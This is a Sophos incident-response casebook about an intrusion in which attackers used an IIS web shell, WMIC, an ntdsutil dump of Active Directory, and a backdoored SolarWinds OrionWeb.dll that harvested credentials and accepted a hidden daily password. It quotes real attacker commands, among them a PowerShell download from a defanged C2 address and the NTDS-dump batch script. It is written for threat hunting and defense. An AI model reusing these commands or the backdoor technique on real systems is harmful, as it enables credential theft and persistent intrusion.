Sophos\n[Rapid Response provides emergency remote incident response for active incidents.](https://sophos.com/rapidresponse)\n\n## Setting the scene\n\nThe organization in question came to Sophos Rapid Response after falling victim to a\n[Ragnar Locker attack in early 2020. A ransomware payload was delivered manually by a](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/)\nhighly capable group at around 2 a.m., while admins were asleep, hitting as many computers\nas they could in quick succession.\n\nThey hit hundreds.\n\n\n-----\n\nSophos Rapid Response was brought in to help identify, contain and neutralize the threat. It\ntook the team less than two days to resolve the active threat and over the following days\nincident responders were able to ascertain the threat actor had entered the network two\nmonths prior to the ransomware attack.\n\nWith the Ragnar group removed from their network, the customer transitioned to the full MTR\nservice in Notify mode with our security operations team watching over them 24/7.\n\nWhile the pressing threat of Ragnar Locker was out of the picture, in November 2020\nanother threat actor stepped into view…\n\n## Sneaking over WMI\n\nIncreasingly, threat actors like to pack light when on a mission. They don’t bring their own\ntools and prefer to “live off the land.” They take advantage of capabilities built into operating\nsystems, like Microsoft Windows, to evade detection.\n\nWindows Management Instrumentation, or WMI for short, is a feature that enables remote\nmanagement and automation of administrative tasks. It’s designed to ease the pains of\nmanaging large enterprise environments with an overwhelming number of computers.\n\nBut in the hands of a threat actor, WMI offers quite the rich toolbox to achieve a number of\nwide-ranging goals. And with WMIC, the command line interface for WMI, adversaries can\nwrite simple yet powerful one-line instructions.\n\nFor example, running Notepad on a remote computer:\n\n\n-----\n\n```\nwmic /user:\"username” /password:”password” /node:\"192.168.0.123\" process call create\n“notepad.exe”\n\n```\nOr listing all the local user accounts on a computer:\n\n\n-----\n\n```\nwmic useraccount get /ALL /format:csv\n\n```\nHunting for abuse of WMI is essential, but discerning the difference between legitimate use\nof WMI and malicious use is no easy task, often requiring a keen eye towards the context of\nthe commands. What commands came before? What commands came after? What is the\nintent?\n\nThese are the questions our MTR operators ask themselves as a number of suspicious\nlooking WMI commands are identified in the customer’s network, all taking place in quick\nsuccession, during a routine threat hunt alongside researchers from SophosLabs.\n\n## Hunting for threat actors\n\nThe threat hunters see the first red flag. WMIC was used to instruct remote computers to\nlaunch commands. This alone is suspicious, but where did the commands come from?\n\nLooking at the hierarchy, `wmic.exe was executed by` `cmd.exe, the Windows Command`\nPrompt. And `cmd.exe was executed by` `w3wp.exe, a worker process for Microsoft IIS – a`\nweb server.\n\nA web server. Surely no measured admin would launch administrative commands to other\nservers from their own web server?\n\nAnd what is going on in this command seen on the web server?\n```\nwmic /node:192.168.0.123 /user:\"REDACTED\" /password:\"REDACTED\" process call create\n\"c:\\Windows\\Temp\\backup.bat\"\n\n```\nWMIC calls out to a remote computer, authenticated with credentials, to create a new\nprocess and execute a script called `backup.bat . On its own, it’s not terribly suspicious. But`\ngiven that this was initiated by a web server worker process, we need to dig deeper. What is\n```\nbackup.bat ?\n\n```\n\n-----\n\nMTR finds another troubling command.\n```\ncmd /c \"powershell (new-object\nsystem.net.webclient).downloadfile('http://98[.]225.248.37:8090/update','c:\\users\\publ\n\n```\nCombined with the context of the previous command, it is clearly suspicious to see\nPowerShell (another Microsoft task automation and configuration management tool) creating\na webclient to “downloadfile” from an unknown host, a file called “update”.\n\nBefore continuing, an MTR operator sends the first notification to the customer and engages\ntheir admin team.\n\nThe operator shares the observed WMIC commands as well as the servers and users\nassociated with the commands, with guidance to reset those user passwords and to use\nSophos Intercept X to isolate the servers from the rest of the network. Additionally, that\nstrange IP address needs blocking on their firewall.\n\nOn with the investigation.\n\nLooking back in time to the preceding commands, the picture becomes clearer.\n\n\n-----\n\n```\ncmd /c echo mkdir c:\\windows\\temp\\tmp > \\\\192.168.0.123\\c$\\Windows\\Temp\\backup.bat \ncmd /c \"echo ntdsutil \"ac i ntds\" ifm \"create full C:\\Windows\\Temp\\tmp\" q q >>\n\\\\192.168.0.123\\c$\\Windows\\Temp\\backup.bat\"\n\n```\nThat’s no backup command. A `.bat file is a Batch script, the classic way of bundling`\nWindows commands together rather than running each by hand.\n\nEcho typically prints a line of text to the screen (i.e. the command terminal) however the `>`\nsymbol is a redirect. Instead of writing the text `mkdir … to the terminal, it’s writing to a file`\non a remote system.\n\nThe threat actor built a script on a remote computer. And they had run it.\n\nFirst it creates a new “tmp” folder in the Windows temporary directory (where things are put\nwhen it doesn’t matter if they disappear later on). Next it uses `ntdsutil.exe …`\n\nTo a veteran threat hunter, the threat actor’s goal is clear.\n\n## Credential access to elevate privileges\n\nNtdsutil is short for NT Directory Services Utility. It is a tool for interacting with Active\nDirectory servers, Microsoft’s centralized suite of technologies responsible for authenticating\nand authorizing users and computers in a Windows domain.\n\nThe arguments `\"ac i ntds\" ifm \"create full …\" writes a full dump, a copy, of the`\nentire Active Directory database intended for the legitimate purpose of domain controller\ndeployment using the “install from media” option.\n\nThis actor tried to get their hands on credentials, and that variant of the command is often\nused by threat actors who have access to the domain controller but don’t yet have domain\nadmin credentials.\n\nThey tried to elevate privileges. And they were caught red-handed.\n\nAn operator gets back in touch with the customer to fill them in with the latest discoveries.\nThe customer initiates domain-wide password resets. Better to be safe than sorry.\n\nWith the malicious IP blocked, all passwords reset, and those servers isolated, the threat\nactor is dead in the water.\n\nBut it is still a mystery how they orchestrated these commands. Where is the initial point of\nentry?\n\nWhat did they do on that webserver?\n\n## Web shells\n\n\n-----\n\nPublic webservers are inherently risky. Not only do they face the internet, making them a\nprime target for an adversary’s initial intrusion into an organization’s network, it’s normal for\nthem to communicate with a wide range of IP addresses never seen before.\n\nAll that web traffic, all that noise, makes web servers a wonderful place to hide and launch\ncommands. Only a keen eye will spot that needle amongst the hay. Especially if you’re only\nlooking at network traffic.\n\nThankfully, MTR collects endpoint telemetry as well as network telemetry, providing rich data\nto contextualize anything that might be found.\n\nLooking over all the commands the threat actor ran on the server, a pattern emerges.\n```\ncmd /c \"copy \\\\192.168.0.123\\c$\\windows\\temp\\tmp\\big.fm f:\\sites\\REDACTED\\big.fm\"\n\n```\nThis command called out to a remote server to copy a file called `big.fm from the tmp`\ndirectory we saw earlier. Sadly, “Big FM” is not the name of the threat actor’s favorite Top 40\nradio station, it’s what the threat actor named the Active Directory database dump.\n\nWhat sticks out in this command, and many others they ran, is they only copied files to a\nparticular folder on the webserver inside `f:\\sites\\ . Almost as if this was the only folder`\nthey had permissions to access. A folder where the website code resides.\n\nThis smells like a web shell.\n\nLooking inside `f:\\sites\\ our MTR operator finds a lonely looking file called`\n```\nabout.aspx . Active Server Page Extended (ASPX) is a framework for writing dynamic\n\n```\nwebsites. Taking a look over the code, our operator observes that the web page will receive\nencoded web requests and send the decoded request to cmd.exe, the Windows command\nprompt.\n\n\n-----\n\nThis is a web shell.\n\nBut why wasn’t it detected earlier?\n\nGrabbing a copy of the file, MTR sends this immediately to SophosLabs for deeper analysis.\nEven as the file passes through our automated analysis systems, it’s clear this web shell\nvariant has never been seen before. SophosLabs researchers quickly tear it apart and\npublish detections for this new variant, protecting all our customers around the globe from\nthis web shell should it be used again.\n\nAt the time of writing this article we are the only vendor with a detection published for this\n[web shell variant (detected as Troj/WebShel-H). The file hash is in the IOCs table at the](https://www.virustotal.com/gui/file/f39dc0dfd43477d65c1380a7cff89296ad72bfa7fc3afcfd8e294f195632030e/detection)\nbottom of this article.\n\n\n-----\n\nWith the web shell neutralized (hopefully along with the threat actor s access), our operators\nmove their focus to answering several important questions: Where did this web shell come\nfrom? What else was it used for? And what was the file update that the threat actor\ndownloaded?\n\n## OrionWeb.dll\n\nScouring historic telemetry gathered by MTR since the service’s technology was deployed\nshows no signs of when the web shell was installed. Plenty of file accesses and timestamp\nmodifications are observed, but it’s clear the web shell was deployed before Rapid Response\nhad been engaged and our telemetry collection began.\n\nThis is a dead end.\n\nLooking to what events preceded the download of the file update prove to be more fruitful\nalbeit concerning including another request to a different C2 – http://216[.]243.39.167:8090/\n– to fetch another version of the file.\n\nThe following command is observed:\n```\ncmd /c \"copy \\\\192.168.0.124\\c$\\inetpub\\SolarWinds\\orion\\update\n\\\\10.128.11.149\\c$\\inetpub\\SolarWinds\\bin\\OrionWeb.dll /y\"\n\n```\nWhatever update is, it has been used to replace a component of SolarWinds Orion called\n```\nOrionWeb.dll .\n\n```\nTime to investigate this DLL.\n\nDLLs are dynamic-link libraries, bundles of executable code that are called upon by\napplications, implementing various features and capabilities of an application. One can’t\nsimply swap out a DLL with something completely different without causing an application to\ncrash or throw lots of errors.\n\nThis needs expert eyes to investigate. MTR shares a sample with SophosLabs for reverse\nengineering and analysis.\n\nThis sample is not cryptographically signed, which is odd for a DLL purporting to be from a\nreputable vendor.\n\n\n-----\n\nDigital signatures are a vital part of the trust model for Microsoft Windows. By using strong\ncryptography, these signatures enable both the authenticity of a file, confirming it is from who\nit says it is from, as well as the integrity of a file, confirming it has not been modified or\ncorrupted in some way.\n\nIf someone were to modify this DLL, the digital signature would no longer validate the file\nintegrity. But if the signature is entirely removed, there’s nothing to use to validate the file\nintegrity at all.\n\nMTR compares the file to a known-good copy of `OrionWeb.dll and it is clear this file was`\nand should be signed. Who removed the signature? And why?\n\n\n-----\n\n```\nOrionWeb.dll is a .NET assembly, written in C# (pronounced “C sharp”). C# is a Microsoft\n\n```\nprogramming language that can easily take advantage of the capabilities of the .NET\n(“dotNET”) framework, and .NET is Microsoft’s powerful framework for writing applications for\ntheir platforms and interfacing with various Microsoft technologies.\n\nOne of the benefits of .NET assemblies is that they can be debugged and modified far easier\n[than traditional compiled executables. One can open them up in a variety of tools like dnSpy](https://github.com/dnSpy/dnSpy)\nand read and change the code they contain.\n\nSophosLabs fully decompile the suspicious DLL and compare it to a known-good sample\n[using the popular diff application WinMerge, a tool that enables file comparison and](https://winmerge.org/)\nhighlights the differences between them.\n\n\n-----\n\nBut as SophosLabs begin to dig into what had been changed, the changes seem incredibly\nminor. For instance, where the class of code `LdapAuthentication previously inherited the`\nother classes `ILdapAuthentication and` `IDisposable in that order, the order was`\nreversed in the suspicious sample.\n\n\n-----\n\nReviewing many of the other classes of code in the files, this same pattern of change is\nobserved – parameters swapped around for no obvious reason. Anyone quick to run their\neye over these changes would rightfully assume that the software developer has just\nrefactored (i.e. reorganized) their code and nothing suspicious or malicious is present.\n\nYet given the context of how this file was discovered, SophosLabs and our operators push on\nwith analyzing the sample to try and discover why this different DLL is so important to them\nthat they needed to replace the original with it.\n\nEventually a discovery is made in the `ValidateUser function (in`\nSolarWinds.Orion.Web.OrionMembershipProvider). A chunk of code has been inserted. And\nit completely changes the behavior of the function.\n\n**This SolarWinds Orion server was backdoored!**\n\n## A Hidden Backdoor\n\n\n-----\n\nThe original `ValidateUser function was quite simple – it would be called with a username`\nand password and then, behind the scenes, it would call another function called\n```\nInternalValidateUser that would do the heavy lifting of authenticating the user.\n\n```\nHowever, the actor behind this threat added a lot of extra logic to the `ValidateUser`\nfunction.\n\nFirst, a `try/catch pattern was inserted on lines 5 and 54 with the` `catch block empty.`\nThis pattern ensures that any errors that may occur in the try block are suppressed and don’t\ncause the whole application to crash or print out errors that may reveal something is awry.\n\nNext, a `StreamWriter was added on line 7 which would write text to a seemingly randomly`\nnamed file in the `C:\\Users\\Default\\AppData\\Local\\Temp\\ directory. Any provided`\nusername and password would be written to the file, encrypted with a simple binary XOR\nand Addition cipher with hard coded keys.\n\nThe adversary wanted to continuously capture a stream of valid usernames and passwords\nfor SolarWinds Orion.\n\n\n-----\n\nAfter that, a conditional `if statement was inserted on line 21 which looked for when the`\nprovided username is `_system . A username that did not exist in the application’s database.`\nA username only the adversary would know about.\n\nWithin the `if statement were several instructions to access the application’s SQL database`\nand delete the audit logs that would have revealed any usage of this `_system username.`\nThe threat actor clearly had knowledge of how OrionWeb functions and how best to cover\ntheir tracks.\n\nA text string was then constructed on line 57 and 58 that would take the number of days\nsince epoch – a specific point in time which is counted upwards from to describe the current\ndate/time. Effectively this string is the number of days since January 1st 1970. Around the\nnumber of days since epoch, `80CD1DB_ and` `_0F90D2 are added, e.g.`\n```\n80CD1DB_42745_0F90D2 .\n\n```\nBut why would a dynamic text string be needed, one that changes every single day? The\nanswer soon becomes clear.\n\nThe final modification was in the return statement on line 59.\n\nThe original statement would call the `InternalValidateUser function. Inferring from the`\nchanges, this function would either return `True or` `False (for either a successful or`\nunsuccessful authentication). Yet the adversary had added two additional ways for the\n```\nValidateUser function to return True . If the password is this dynamic text string, or if the\n\n```\nusername is “_system” and the password is also the dynamic text string.\n\nThe adversary implanted a custom, dynamic password and username that only they would\nknow about and ensured their usage of these credentials would never end up in the\nSolarWinds Orion audit logs.\n\nAnd then another malicious injection is found.\n\nLurking in the `GetLdapIdentity function (in`\n```\nSolarWinds.Orion.Web.OrionMixedModeAuth ), SophosLabs discover the following code:\n\n```\n\n-----\n\nSimilar to the `StreamWriter observed above, the functionality intercepts credentials as`\nthey are being used by the application and encrypts and writes them to another seemingly\nrandomly named file. But this time the adversary is stealing LDAP, Lightweight Directory\nAccess Protocol, credentials which are used for authenticating with directory services like\nMicrosoft Active Directory.\n\nThe adversary wanted to continuously capture a stream of valid usernames and passwords\nfor the customer’s domain, not just for SolarWinds Orion.\n\nThankfully, the affected hosts are already isolated. MTR confirms with the customer that\nthese hosts are taken offline and are rebuilt to ensure no backdoor remains in their network.\n\n## The Big Picture\n\nThe sequence of events is now clear:\n\nThe threat actor gained access to the web server and installed a web shell to send\ncommands and orchestrate the rest of the attack\nA backdoored version of OrionWeb.dll was downloaded from their C2 server. Additional\nlogic was added to authenticate the username “_system” with a dynamic password that\nwould change every day and the digital signature of the file removed.\nOrionWeb.dll was replaced with their backdoored version.\nDiscovery was performed and domain controllers accessed to create a full dump of\nActive Directory to use for privilege escalation or to exfiltrate.\n\nGiven the recent supply chain attack on SolarWinds, this attack is certainly of note. However,\nwe could not identify concrete evidence that the two are connected. The C2s, web shell, and\nDLL used in this attack are not ones we have observed before, outside of this single incident,\nnor have we observed them used since.\n\nThis style of attack is not specific to SolarWinds Orion and does not rely upon the\nexploitation of a vulnerability in its code. A threat actor can reverse engineer and maliciously\nmodify a .NET assembly using freely available tools with no requirement for source code\naccess.\n\nThe threat actor behind this attack is clearly highly skilled and capable. Their playbook of\nidentifying viable .NET assemblies to backdoor underlines the importance of threat hunting,\nas well as application allowlisting and file integrity monitoring (both available in Sophos\nIntercept X Advanced for Server).\n\nWe hope the details shared through this casebook as well as the IOAs and IOCs below\nenable threat hunters around the globe to look for similar malicious modifications of\nOrionWeb.dll and other .NET assemblies, which will aid in better protection for all.\n\n\n-----\n\n## Learn more\n\n[For more information on the Sophos MTR service visit our website or](https://sophos.com/mtr) speak with a Sophos\nrepresentative.\n\n[If you prefer to conduct your own threat hunts Sophos EDR gives you the tools you need for](https://www.sophos.com/en-us/products/endpoint-antivirus/edr.aspx)\n[advanced threat hunting and IT security operations hygiene.
